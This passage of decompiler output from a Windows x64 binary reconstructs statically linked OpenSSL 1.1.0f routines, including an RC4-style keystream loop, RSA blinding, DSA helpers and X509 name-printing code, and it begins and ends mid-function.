        if ( !v52 )
          break;
        v4 = (unsigned __int8)(v4 + 1);
        v53 = a1[v4 + 2];
        v5 = (unsigned __int8)(v53 + v5);
        v54 = a1[v5 + 2];
        a1[v4 + 2] = v54;
        a1[v5 + 2] = v53;
        result = a3[4] ^ LOBYTE(a1[(unsigned __int8)(v54 + v53) + 2]);
        a4[4] = result;
        v55 = v52 - 1;
        if ( !v55 )
          break;
        v4 = (unsigned __int8)(v4 + 1);
        v56 = a1[v4 + 2];
        v5 = (unsigned __int8)(v56 + v5);
        v57 = a1[v5 + 2];
        a1[v4 + 2] = v57;
        a1[v5 + 2] = v56;
        result = a3[5] ^ LOBYTE(a1[(unsigned __int8)(v57 + v56) + 2]);
        a4[5] = result;
        v58 = v55 - 1;
        if ( !v58 )
          break;
        v4 = (unsigned __int8)(v4 + 1);
        v59 = a1[v4 + 2];
        v5 = (unsigned __int8)(v59 + v5);
        v60 = a1[v5 + 2];
        a1[v4 + 2] = v60;
        a1[v5 + 2] = v59;
        result = a3[6] ^ LOBYTE(a1[(unsigned __int8)(v60 + v59) + 2]);
        a4[6] = result;
        v61 = v58 - 1;
        if ( !v61 )
          break;
        v4 = (unsigned __int8)(v4 + 1);
        v62 = a1[v4 + 2];
        v5 = (unsigned __int8)(v62 + v5);
        v63 = a1[v5 + 2];
        a1[v4 + 2] = v63;
        a1[v5 + 2] = v62;
        result = *a3 ^ LOBYTE(a1[(unsigned __int8)(v63 + v62) + 2]);
        *a4 = result;
        v43 = v61 - 1;
      }
      while ( v43 );
    }
  }
  *a1 = v4;
  a1[1] = v5;
  return result;
}

//----- (000000014005E300) ----------------------------------------------------
__int64 __fastcall sub_14005E300(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  return (*(__int64 (**)(void))(*(_QWORD *)(a4 + 8) + 32i64))();
}

//----- (000000014005E320) ----------------------------------------------------
__int64 __fastcall sub_14005E320(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  return (*(__int64 (**)(void))(*(_QWORD *)(a4 + 8) + 24i64))();
}

//----- (000000014005E340) ----------------------------------------------------
__int64 __fastcall sub_14005E340(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  return (*(__int64 (**)(void))(*(_QWORD *)(a4 + 8) + 16i64))();
}

//----- (000000014005E360) ----------------------------------------------------
__int64 __fastcall sub_14005E360(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  return (*(__int64 (**)(void))(*(_QWORD *)(a4 + 8) + 8i64))();
}

//----- (000000014005E380) ----------------------------------------------------
__int64 *__fastcall sub_14005E380(_QWORD *a1, int *a2)
{
  __int64 *v2; // r15
  __int64 *result; // rax
  int *v6; // rdi
  _DWORD *v7; // rbp
  __int64 v8; // rcx
  unsigned int v9; // ebx
  __int64 v10; // rax
  _DWORD *v11; // rax
  _DWORD *v12; // rbx

  v2 = 0i64;
  if ( a2 )
  {
    v6 = a2;
  }
  else
  {
    result = sub_140027CD0();
    v6 = (int *)result;
    if ( !result )
      return result;
  }
  sub_140027D40(v6);
  v7 = sub_140027C40(v6);
  if ( v7 )
  {
    v7 = (_DWORD *)a1[4];
    if ( v7 || (v7 = sub_14005E5B0(a1[5], a1[6], a1[7], v6)) != 0i64 )
    {
      if ( !(unsigned int)sub_140025630() )
      {
        v8 = a1[5];
        if ( v8 )
        {
          if ( sub_140021BD0(v8) )
          {
            v9 = 8 * sub_140024EA0(a1[5]);
            v10 = sub_140021BD0(a1[5]);
            sub_140025410(v10, v9);
          }
        }
      }
      v11 = sub_140027200();
      v12 = v11;
      if ( v11 )
      {
        sub_140027660((__int64)v11, a1[3], 4);
        v2 = sub_14004DD40(0i64, (__int64)v7, (__int64)v12, v6, *(_QWORD *)(a1[1] + 48i64), a1[13]);
        sub_140026FF0(v12);
        if ( v2 )
          sub_14004E160((__int64)v2);
        else
          sub_140024610(4, 136, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_crpt.c", 164);
      }
      else
      {
        sub_140024610(4, 136, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_crpt.c", 153);
      }
    }
    else
    {
      sub_140024610(4, 136, 140, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_crpt.c", 133);
    }
  }
  else
  {
    sub_140024610(4, 136, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_crpt.c", 126);
  }
  sub_140027B60((__int64)v6);
  if ( v6 != a2 )
    sub_140027BE0((__int64)v6);
  if ( v7 != (_DWORD *)a1[4] )
    sub_140026FF0(v7);
  return v2;
}

//----- (000000014005E580) ----------------------------------------------------
__int64 __fastcall sub_14005E580(__int64 a1)
{
  return (unsigned int)((int)(sub_140027260(*(_QWORD *)(a1 + 24)) + 7) / 8);
}

//----- (000000014005E5B0) ----------------------------------------------------
_DWORD *__fastcall sub_14005E5B0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  _DWORD *v4; // rdi
  __int64 *v9; // r12
  _QWORD *v10; // r13
  _QWORD *v11; // r15
  void **v12; // rax
  void **v13; // rax

  v4 = 0i64;
  if ( !a1 || !a2 || !a3 )
    return 0i64;
  sub_140027D40(a4);
  v9 = sub_140027C40(a4);
  v10 = sub_140027C40(a4);
  v11 = sub_140027C40(a4);
  if ( v11 )
  {
    v12 = sub_140027650();
    if ( (unsigned int)sub_140041AC0((__int64)v10, a2, (__int64)v12) )
    {
      v13 = sub_140027650();
      if ( (unsigned int)sub_140041AC0((__int64)v11, a3, (__int64)v13) )
      {
        if ( (unsigned int)sub_14006E5B0((__int64)v9, (__int64)v10, (__int64)v11, a4) )
          v4 = sub_14006FDD0(0i64, a1, v9, a4);
      }
    }
  }
  sub_140027B60((__int64)a4);
  return v4;
}

//----- (000000014005E6C0) ----------------------------------------------------
void __fastcall sub_14005E6C0(void **a1)
{
  if ( a1 )
  {
    sub_14001D930(*a1);
    sub_14001D930(a1);
  }
}

//----- (000000014005E710) ----------------------------------------------------
_QWORD *__fastcall sub_14005E710(_BYTE *a1, int a2)
{
  int v2; // eax
  _QWORD *v5; // rax
  _QWORD *v6; // rbx
  void *v7; // rax

  v5 = sub_14001DC20((unsigned int)(v2 + 64));
  v6 = v5;
  if ( v5 )
  {
    *((_DWORD *)v5 + 18) = a2;
    v7 = sub_14003BB60(a1);
    *v6 = v7;
    if ( v7 )
      return v6;
    sub_14001D930(v6);
  }
  sub_140024610(4, 162, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_meth.c", 28);
  return 0i64;
}
// 14005E738: variable 'v2' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014005E7D0) ----------------------------------------------------
__int64 __fastcall sub_14005E7D0(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 8) = a2;
  return 1i64;
}

//----- (000000014005E7E0) ----------------------------------------------------
__int64 __fastcall sub_14005E7E0(int a1, __int64 *a2)
{
  __int64 v3; // rax
  __int64 result; // rax

  if ( a1 )
  {
    if ( a1 == 2 )
    {
      sub_14002D940(*a2);
      result = 2i64;
      *a2 = 0i64;
    }
    else
    {
      return 1i64;
    }
  }
  else
  {
    v3 = sub_14002DA60();
    *a2 = v3;
    return v3 != 0 ? 2 : 0;
  }
  return result;
}

//----- (000000014005E840) ----------------------------------------------------
void __fastcall sub_14005E840(__int64 **a1)
{
  if ( a1 )
  {
    sub_140026A10(*a1);
    sub_140026A10(a1[1]);
    sub_14001D930(a1);
  }
}

//----- (000000014005E890) ----------------------------------------------------
__int64 __fastcall sub_14005E890(__int64 *a1, __int64 *a2, _QWORD *a3)
{
  __int64 result; // rax

  if ( a2 )
  {
    result = *a1;
    *a2 = *a1;
  }
  if ( a3 )
  {
    result = a1[1];
    *a3 = result;
  }
  return result;
}

//----- (000000014005E8B0) ----------------------------------------------------
void *__fastcall sub_14005E8B0()
{
  int v0; // eax
  void *result; // rax

  result = sub_14001DC20((unsigned int)(v0 - 32));
  if ( !result )
  {
    sub_140024610(10, 102, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_asn1.c", 28);
    return 0i64;
  }
  return result;
}
// 14005E8CA: variable 'v0' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014005E910) ----------------------------------------------------
__int64 __fastcall sub_14005E910(__int64 **a1, __int64 *a2, __int64 *a3)
{
  __int64 result; // rax

  if ( !a2 || !a3 )
    return 0i64;
  sub_140026A10(*a1);
  sub_140026A10(a1[1]);
  result = 1i64;
  *a1 = a2;
  a1[1] = a3;
  return result;
}

//----- (000000014005E980) ----------------------------------------------------
__int64 sub_14005E980(__int64 a1, __int64 a2, unsigned int a3, ...)
{
  unsigned int *v5; // rax
  __int64 **v6; // rbx
  int v8; // eax
  unsigned __int8 *v9; // [rsp+48h] [rbp+20h] BYREF
  va_list va; // [rsp+48h] [rbp+20h]
  _DWORD *v11; // [rsp+50h] [rbp+28h]
  __int64 v12; // [rsp+58h] [rbp+30h]
  va_list va1; // [rsp+60h] [rbp+38h] BYREF

  va_start(va1, a3);
  va_start(va, a3);
  v9 = va_arg(va1, unsigned __int8 *);
  v11 = va_arg(va1, _DWORD *);
  v12 = va_arg(va1, _QWORD);
  sub_140025570(a2, a3);
  v5 = (unsigned int *)sub_1400A4770(a2, a3, v12);
  v6 = (__int64 **)v5;
  if ( v5 )
  {
    v8 = sub_1400536F0(v5, (unsigned __int8 **)va, (__int64)&unk_1400FB2B0);
    *v11 = v8;
    sub_140026A10(*v6);
    sub_140026A10(v6[1]);
    sub_14001D930(v6);
    return 1i64;
  }
  else
  {
    *v11 = 0;
    return 0i64;
  }
}

//----- (000000014005EA30) ----------------------------------------------------
__int64 __fastcall sub_14005EA30(__int64 a1, __int64 a2, unsigned int a3, char *a4, unsigned int a5, __int64 a6)
{
  int v6; // eax
  int v9; // ebx
  unsigned int v10; // esi
  unsigned int *v12; // rdi
  unsigned int v14; // edi
  int v15; // eax
  __int64 **v16; // rbx
  void *Buf2; // [rsp+30h] [rbp-28h] BYREF
  char *v18; // [rsp+38h] [rbp-20h] BYREF
  unsigned int *v19; // [rsp+78h] [rbp+20h] BYREF

  v18 = a4;
  Buf2 = 0i64;
  v9 = -1;
  v10 = -1;
  v12 = (unsigned int *)sub_14001DC20((unsigned int)(v6 - 48));
  if ( !v12 )
    sub_140024610(10, 102, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_asn1.c", 28);
  v19 = v12;
  if ( !v12 )
    return 0xFFFFFFFFi64;
  v14 = a5;
  if ( sub_1400516D0((__int64 *)&v19, &v18, a5, (__int64)&unk_1400FB2B0) )
  {
    v15 = sub_1400536F0(v19, (unsigned __int8 **)&Buf2, (__int64)&unk_1400FB2B0);
    v9 = v15;
    if ( v15 == v14 && !memcmp(a4, Buf2, v15) )
      v10 = sub_1400A4790(a2, a3, (__int64)v19, a6);
  }
  sub_14001DA40(Buf2, v9, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_asn1.c", 0x98u);
  v16 = (__int64 **)v19;
  if ( v19 )
  {
    sub_140026A10(*(__int64 **)v19);
    sub_140026A10(v16[1]);
    sub_14001D930(v16);
  }
  return v10;
}
// 14005EA75: variable 'v6' is possibly undefined

//----- (000000014005EB90) ----------------------------------------------------
__int64 __fastcall sub_14005EB90(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_1400FB3F0);
}

//----- (000000014005EBB0) ----------------------------------------------------
__int64 __fastcall sub_14005EBB0(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_1400FB2B0);
}

//----- (000000014005EBD0) ----------------------------------------------------
__int64 __fastcall sub_14005EBD0(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_1400FB480);
}

//----- (000000014005EBF0) ----------------------------------------------------
__int64 __fastcall sub_14005EBF0(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_1400FB3F0);
}

//----- (000000014005EC10) ----------------------------------------------------
__int64 __fastcall sub_14005EC10(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_1400FB480);
}

//----- (000000014005EC30) ----------------------------------------------------
void __fastcall sub_14005EC30(void **a1)
{
  if ( a1 )
  {
    sub_14001D930(*a1);
    sub_14001D930(a1);
  }
}

//----- (000000014005EC80) ----------------------------------------------------
_QWORD *__fastcall sub_14005EC80(_BYTE *a1, int a2)
{
  int v2; // eax
  _QWORD *v5; // rax
  _QWORD *v6; // rbx
  void *v7; // rax

  v5 = sub_14001DC20((unsigned int)(v2 + 48));
  v6 = v5;
  if ( v5 )
  {
    *((_DWORD *)v5 + 16) = a2;
    v7 = sub_14003BB60(a1);
    *v6 = v7;
    if ( v7 )
      return v6;
    sub_14001D930(v6);
  }
  sub_140024610(10, 128, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_meth.c", 36);
  return 0i64;
}
// 14005ECA8: variable 'v2' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014005ED40) ----------------------------------------------------
void *sub_14005ED40()
{
  return &unk_1400FB860;
}

//----- (000000014005ED50) ----------------------------------------------------
__int64 __fastcall sub_14005ED50(int a1, __int64 *a2)
{
  int v2; // eax
  __int64 v3; // rbx
  int v4; // ecx
  __int64 result; // rax

  v3 = *a2;
  v4 = a1 - 1;
  if ( v4 )
  {
    if ( v4 == 2 )
    {
      sub_140025FB0(v2 - 29, *a2, (__int64 *)(v3 + 176));
      sub_1400A5410(*(unsigned int **)(v3 + 296));
      sub_14004FD70(*(_QWORD *)(v3 + 208));
      sub_1400A5500(*(unsigned int **)(v3 + 216));
      sub_1400A5CD0(*(unsigned int **)(v3 + 232));
      sub_1400A9C80(*(void ***)(v3 + 224));
      sub_1400A5580(*(unsigned int **)(v3 + 240));
      sub_1400A67E0(*(unsigned int **)(v3 + 248));
      sub_140029720(*(void **)(v3 + 256), (void (*)(void))sub_1400A8530);
      sub_1400A76A0(*(unsigned int **)(v3 + 264));
    }
    return 1i64;
  }
  *(_QWORD *)(v3 + 184) = -1i64;
  *(_DWORD *)(v3 + 192) = 0;
  *(_QWORD *)(v3 + 208) = 0i64;
  *(_QWORD *)(v3 + 216) = 0i64;
  *(_QWORD *)(v3 + 256) = 0i64;
  *(_QWORD *)(v3 + 264) = 0i64;
  *(_QWORD *)(v3 + 296) = 0i64;
  *(_QWORD *)(v3 + 232) = 0i64;
  result = (__int64)sub_140026350(3u, v3, (__int64 *)(v3 + 176));
  if ( (_DWORD)result )
    return 1i64;
  return result;
}
// 14005ED7E: variable 'v2' is possibly undefined

//----- (000000014005EE60) ----------------------------------------------------
void __fastcall sub_14005EE60(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_1400FB6F0);
}

//----- (000000014005EE80) ----------------------------------------------------
__int64 __fastcall sub_14005EE80(_QWORD *a1, _QWORD *a2, __int64 a3)
{
  __int64 result; // rax

  if ( a1 )
  {
    result = a3 + 144;
    *a1 = a3 + 144;
  }
  if ( a2 )
  {
    result = a3 + 128;
    *a2 = a3 + 128;
  }
  return result;
}

//----- (000000014005EEA0) ----------------------------------------------------
__int64 __fastcall sub_14005EEA0(__int64 a1, int a2)
{
  return sub_140026190((__int64 *)(a1 + 176), a2);
}

//----- (000000014005EEC0) ----------------------------------------------------
void *sub_14005EEC0()
{
  return &unk_1400FB6F0;
}

//----- (000000014005EED0) ----------------------------------------------------
__int64 __fastcall sub_14005EED0(__int64 a1, int a2, __int64 a3)
{
  return sub_140026520((unsigned int **)(a1 + 176), a2, a3);
}

//----- (000000014005EEF0) ----------------------------------------------------
__int64 __fastcall sub_14005EEF0(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_1400FB6F0);
}

//----- (000000014005EF10) ----------------------------------------------------
__int64 __fastcall sub_14005EF10(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_1400FB6F0);
}

//----- (000000014005EF30) ----------------------------------------------------
int __fastcall sub_14005EF30(__int64 a1, __int64 a2)
{
  int result; // eax

  if ( (!*(_QWORD *)(a1 + 24) || *(_DWORD *)(a1 + 8)) && (int)sub_1400A4F80((unsigned int *)a1, 0i64) < 0
    || (!*(_QWORD *)(a2 + 24) || *(_DWORD *)(a2 + 8)) && (int)sub_1400A4F80((unsigned int *)a2, 0i64) < 0 )
  {
    return -2;
  }
  result = *(_DWORD *)(a1 + 32) - *(_DWORD *)(a2 + 32);
  if ( !result )
    return memcmp(*(const void **)(a1 + 24), *(const void **)(a2 + 24), *(int *)(a1 + 32));
  return result;
}

//----- (000000014005EFC0) ----------------------------------------------------
__int64 __fastcall sub_14005EFC0(__int64 a1)
{
  if ( a1 )
    return sub_1400677A0(*(_QWORD *)(a1 + 80));
  else
    return 0i64;
}

//----- (000000014005F000) ----------------------------------------------------
__int64 __fastcall sub_14005F000(__int64 a1)
{
  return *(_QWORD *)(a1 + 72);
}

//----- (000000014005F010) ----------------------------------------------------
__int64 __fastcall sub_14005F010(_QWORD *a1, __int64 a2)
{
  __int64 v3; // rax
  int v4; // r9d
  int v5; // r8d
  char *v6; // rdx
  __int64 result; // rax
  unsigned int v8; // [rsp+30h] [rbp-28h] BYREF
  __int64 v9; // [rsp+38h] [rbp-20h]
  int v10; // [rsp+40h] [rbp-18h]
  unsigned int *v11; // [rsp+68h] [rbp+10h] BYREF

  v11 = &v8;
  if ( !a2 )
    return 0xFFFFFFFFi64;
  v3 = *(int *)(a2 + 4);
  if ( (unsigned int)v3 > 0x1E )
    return 0xFFFFFFFFi64;
  v4 = byte_1400FBA28[v3];
  if ( v4 == -1 )
    return 0xFFFFFFFFi64;
  v5 = *(_DWORD *)a2;
  v6 = *(char **)(a2 + 8);
  v9 = 0i64;
  v8 = 0;
  v10 = 0;
  result = sub_1400AB060(&v11, v6, v5, v4 | 0x1000u, 0x2000);
  if ( (int)result >= 0 )
  {
    *a1 = v9;
    return v8;
  }
  return result;
}

//----- (000000014005F0A0) ----------------------------------------------------
__int64 __fastcall sub_14005F0A0(__int64 a1, unsigned int **a2, int a3, int a4)
{
  if ( a4 )
    return sub_14005F6C0((unsigned int (__fastcall *)(__int64, const char *, __int64))sub_14005FC40, a1, a2, a3, a4);
  else
    return sub_1400A4CD0(a1, a2);
}

//----- (000000014005F0E0) ----------------------------------------------------
__int64 __fastcall sub_14005F0E0(
        __int64 a1,
        int a2,
        int a3,
        char a4,
        _BYTE *a5,
        __int64 (__fastcall *a6)(__int64, const char *, __int64),
        __int64 a7)
{
  __int64 v7; // r10
  __int64 (__fastcall *v9)(__int64, const char *, __int64); // r9
  char v10; // r11
  unsigned int v11; // esi
  unsigned __int8 *v12; // r13
  _BYTE *v13; // r8
  __int64 v14; // rax
  unsigned __int8 *v15; // rbx
  int v16; // ecx
  char v17; // r15
  int v18; // ecx
  int v19; // ecx
  int v20; // ecx
  int v21; // eax
  __int64 v22; // rdi
  int v23; // eax
  __int64 v24; // r14
  unsigned __int8 v25; // bp
  _BYTE *v26; // r15
  int v27; // eax
  int v28; // eax
  int v30; // [rsp+30h] [rbp-78h] BYREF
  int v31; // [rsp+34h] [rbp-74h]
  int v32; // [rsp+38h] [rbp-70h]
  int v33; // [rsp+3Ch] [rbp-6Ch]
  _BYTE *v34; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall *v35)(__int64, const char *, __int64); // [rsp+48h] [rbp-60h]
  __int64 v36; // [rsp+50h] [rbp-58h]
  __int64 v37; // [rsp+58h] [rbp-50h]
  char v38[8]; // [rsp+60h] [rbp-48h] BYREF

  v7 = a7;
  v9 = a6;
  v10 = a3;
  v11 = 0;
  v12 = (unsigned __int8 *)(a1 + a2);
  v31 = a3;
  v13 = a5;
  v14 = a1;
  v33 = a2;
  v15 = (unsigned __int8 *)a1;
  v37 = a1;
  v34 = a5;
  v35 = a6;
  v36 = a7;
  if ( (unsigned __int8 *)a1 == v12 )
    return v11;
  v16 = v10 & 7;
  v32 = v16;
  while ( 1 )
  {
    v17 = v15 == (unsigned __int8 *)v14 && (a4 & 1) != 0 ? 32 : 0;
    if ( v16 )
    {
      v18 = v16 - 1;
      if ( v18 )
      {
        v19 = v18 - 1;
        if ( v19 )
        {
          if ( v19 != 2 )
            return 0xFFFFFFFFi64;
          v30 = *v15 << 24;
          v30 |= v15[1] << 16;
          v30 |= v15[2] << 8;
          v20 = v15[3] | v30;
          v30 = v20;
          v15 += 4;
        }
        else
        {
          v30 = *v15 << 8;
          v20 = v15[1] | v30;
          v30 = v20;
          v15 += 2;
        }
      }
      else
      {
        v20 = *v15++;
        v30 = v20;
      }
    }
    else
    {
      v21 = sub_1400AA130((char *)v15, a2, &v30);
      if ( v21 < 0 )
        return 0xFFFFFFFFi64;
      v20 = v30;
      v13 = v34;
      v9 = v35;
      v7 = v36;
      v10 = v31;
      v15 += v21;
    }
    if ( v15 == v12 && (a4 & 1) != 0 )
      v17 = 64;
    if ( (v10 & 8) != 0 )
      break;
    v28 = sub_14005F420(v20, v17 | a4, v13, v9, v7);
    if ( v28 < 0 )
      return 0xFFFFFFFFi64;
    v11 += v28;
LABEL_24:
    if ( v15 == v12 )
      return v11;
    v13 = v34;
    v9 = v35;
    v7 = v36;
    v16 = v32;
    v14 = v37;
    v10 = v31;
    a2 = v33;
  }
  v22 = 0i64;
  v23 = sub_1400AA3E0(v38, 6, v20);
  v24 = v23;
  if ( v23 <= 0 )
    goto LABEL_24;
  v25 = v17 | a4;
  v26 = v34;
  while ( 1 )
  {
    v27 = sub_14005F420((unsigned __int8)v38[v22], v25, v26, v35, v36);
    if ( v27 < 0 )
      return 0xFFFFFFFFi64;
    v11 += v27;
    if ( ++v22 >= v24 )
      goto LABEL_24;
  }
}
// 14005F0E0: using guessed type char var_48[8];

//----- (000000014005F320) ----------------------------------------------------
__int64 __fastcall sub_14005F320(
        __int16 a1,
        unsigned int (__fastcall *a2)(__int64, char *, __int64),
        __int64 a3,
        __int64 a4)
{
  int v4; // eax
  int v10; // eax
  int v11; // ebx
  unsigned __int8 *v12; // rax
  unsigned __int8 *v13; // rbp
  int v14; // ebx
  unsigned int v15; // [rsp+20h] [rbp-18h] BYREF
  __int64 v16; // [rsp+28h] [rbp-10h]
  unsigned __int8 *v17; // [rsp+48h] [rbp+10h] BYREF

  if ( !a2(a3, "#", (unsigned int)(v4 - 47)) )
    return 0xFFFFFFFFi64;
  if ( (a1 & 0x200) == 0 )
  {
    v10 = sub_14005F5A0(a2, a3, *(_BYTE **)(a4 + 8), *(_DWORD *)a4);
    if ( v10 >= 0 )
      return (unsigned int)(v10 + 1);
    return 0xFFFFFFFFi64;
  }
  v15 = *(_DWORD *)(a4 + 4);
  v16 = a4;
  v11 = sub_1400500D0(&v15, 0i64);
  v12 = (unsigned __int8 *)sub_14001D8E0(v11);
  v13 = v12;
  if ( !v12 )
    return 0xFFFFFFFFi64;
  v17 = v12;
  sub_1400500D0(&v15, &v17);
  v14 = sub_14005F5A0(a2, a3, v13, v11);
  sub_14001D930(v13);
  if ( v14 < 0 )
    return 0xFFFFFFFFi64;
  return (unsigned int)(v14 + 1);
}
// 14005F345: variable 'v4' is possibly undefined

//----- (000000014005F420) ----------------------------------------------------
__int64 __fastcall sub_14005F420(
        unsigned int a1,
        unsigned __int8 a2,
        _BYTE *a3,
        __int64 (__fastcall *a4)(__int64, const char *, __int64),
        __int64 a5)
{
  unsigned __int8 v6; // r9
  const char *v7; // rdx
  unsigned int v8; // ebx
  __int16 v9; // cx
  int v10; // eax
  char v12[8]; // [rsp+20h] [rbp-38h] BYREF
  char v13[16]; // [rsp+28h] [rbp-30h] BYREF

  v6 = a1;
  if ( a1 > 0xFFFF )
  {
    sub_14002A5C0(v13, 0xBui64, "\\W%08lX", a1);
    v7 = v13;
    v8 = 10;
LABEL_13:
    v10 = a4(a5, v7, v8);
    goto LABEL_14;
  }
  if ( a1 > 0xFF )
  {
    sub_14002A5C0(v13, 0xBui64, "\\U%04lX", a1);
    v7 = v13;
    v8 = 6;
    goto LABEL_13;
  }
  v12[0] = a1;
  if ( (unsigned __int8)a1 <= 0x7Fu )
    v9 = a2 & word_1400FB910[(unsigned __int8)a1];
  else
    v9 = a2 & 4;
  if ( (v9 & 0x61) == 0 )
  {
    if ( (v9 & 0x406) != 0 )
    {
      sub_14002A5C0(v13, 0xBui64, "\\%02X", v6);
      v7 = v13;
      v8 = 3;
      goto LABEL_13;
    }
    if ( v6 == 92 && (a2 & 0xF) != 0 )
    {
      v8 = 2;
      v7 = "\\\\";
      goto LABEL_13;
    }
    goto LABEL_12;
  }
  if ( (v9 & 8) != 0 )
  {
    if ( a3 )
      *a3 = 1;
LABEL_12:
    v7 = v12;
    v8 = 1;
    goto LABEL_13;
  }
  if ( !(unsigned int)a4(a5, "\\", 1i64) )
    return 0xFFFFFFFFi64;
  v10 = a4(a5, v12, 1i64);
  v8 = 2;
LABEL_14:
  if ( !v10 )
    return (unsigned int)-1;
  return v8;
}
// 1400FB910: using guessed type _WORD word_1400FB910[128];
// 14005F420: using guessed type char var_38[8];

//----- (000000014005F5A0) ----------------------------------------------------
__int64 __fastcall sub_14005F5A0(
        unsigned int (__fastcall *a1)(__int64, char *, __int64),
        __int64 a2,
        _BYTE *a3,
        int a4)
{
  _BYTE *v5; // rbx
  _BYTE *v8; // rdi
  __int64 v9; // rcx
  char v11; // [rsp+48h] [rbp+10h] BYREF
  char v12; // [rsp+49h] [rbp+11h]

  v5 = a3;
  if ( !a2 )
    return (unsigned int)(2 * a4);
  v8 = &a3[a4];
  if ( a3 == v8 )
    return (unsigned int)(2 * a4);
  while ( 1 )
  {
    v9 = *v5 & 0xF;
    v11 = a0123456789abcd_3[(unsigned __int64)(unsigned __int8)*v5 >> 4];
    v12 = a0123456789abcd_3[v9];
    if ( !a1(a2, &v11, 2i64) )
      break;
    if ( ++v5 == v8 )
      return (unsigned int)(2 * a4);
  }
  return 0xFFFFFFFFi64;
}

//----- (000000014005F650) ----------------------------------------------------
__int64 __fastcall sub_14005F650(unsigned int (__fastcall *a1)(__int64, const char *, __int64), __int64 a2, int a3)
{
  int v3; // ebx

  v3 = 0;
  if ( a3 <= 0 )
    return 1i64;
  while ( a1(a2, " ", 1i64) )
  {
    if ( ++v3 >= a3 )
      return 1i64;
  }
  return 0i64;
}

//----- (000000014005F6C0) ----------------------------------------------------
__int64 __fastcall sub_14005F6C0(
        unsigned int (__fastcall *a1)(__int64, const char *, __int64),
        __int64 a2,
        unsigned int **a3,
        int a4,
        int a5)
{
  unsigned int v5; // esi
  int v6; // ebp
  int v10; // ecx
  int v11; // eax
  const char *v12; // rax
  const char *v13; // r13
  unsigned int v14; // r12d
  const char *v15; // rcx
  int v16; // edx
  int v17; // eax
  int v18; // r8d
  int v19; // ecx
  int v20; // edx
  __int64 v21; // rax
  __int64 v22; // rbx
  __int64 v23; // rdi
  __int64 v24; // rbx
  unsigned int v25; // ebp
  unsigned int v26; // edi
  char *v27; // rdx
  unsigned int v28; // ebx
  char *i; // rax
  unsigned int v30; // ebx
  int v31; // edi
  unsigned int v32; // eax
  __int16 v33; // r8
  int v34; // eax
  unsigned int v35; // [rsp+20h] [rbp-E8h]
  int v36; // [rsp+24h] [rbp-E4h]
  int v37; // [rsp+28h] [rbp-E0h]
  int v38; // [rsp+2Ch] [rbp-DCh]
  const char *v39; // [rsp+30h] [rbp-D8h]
  unsigned int v40; // [rsp+38h] [rbp-D0h]
  int v41; // [rsp+3Ch] [rbp-CCh]
  int v42; // [rsp+40h] [rbp-C8h]
  __int64 v44; // [rsp+50h] [rbp-B8h]
  const char *v45; // [rsp+58h] [rbp-B0h]
  __int64 v46; // [rsp+60h] [rbp-A8h]
  char v47[80]; // [rsp+70h] [rbp-98h] BYREF

  v5 = 0;
  v6 = -1;
  if ( a4 >= 0 )
    v5 = a4;
  if ( !(unsigned int)sub_14005F650(a1, a2, v5) )
    return 0xFFFFFFFFi64;
  v10 = 3;
  v11 = a5 & 0xF0000;
  if ( (a5 & 0xF0000) != 0x10000 )
  {
    switch ( v11 )
    {
      case 0x20000:
        v12 = ", ";
        break;
      case 0x30000:
        v12 = "; ";
        break;
      case 0x40000:
        v12 = "\n";
        v35 = 3;
        v13 = " + ";
        v36 = v5;
        goto LABEL_15;
      default:
        return 0xFFFFFFFFi64;
    }
    v35 = 3;
    v36 = 0;
    v13 = " + ";
    v14 = 2;
    goto LABEL_16;
  }
  v35 = 1;
  v36 = 0;
  v12 = ",";
  v13 = "+";
LABEL_15:
  v14 = 1;
LABEL_16:
  v39 = v12;
  if ( (a5 & 0x800000) == 0 )
    v10 = 1;
  v40 = v10;
  v15 = " = ";
  if ( (a5 & 0x800000) == 0 )
    v15 = "=";
  v45 = v15;
  v16 = sub_1400ABE10(a3);
  v41 = v16;
  v17 = 0;
  v37 = 0;
  if ( v16 > 0 )
  {
    v44 = a5 & 0x600000;
    v18 = a5 & 0x100000;
    v19 = v16 - 1;
    v38 = v16 - 1;
    while ( 1 )
    {
      v20 = v19;
      if ( !v18 )
        v20 = v17;
      v21 = sub_1400ABE40((__int64 *)a3, v20);
      v22 = v21;
      if ( v6 != -1 )
      {
        if ( v6 == (unsigned int)sub_140024CF0(v21) )
        {
          if ( !a1(a2, v13, v35) )
            return 0xFFFFFFFFi64;
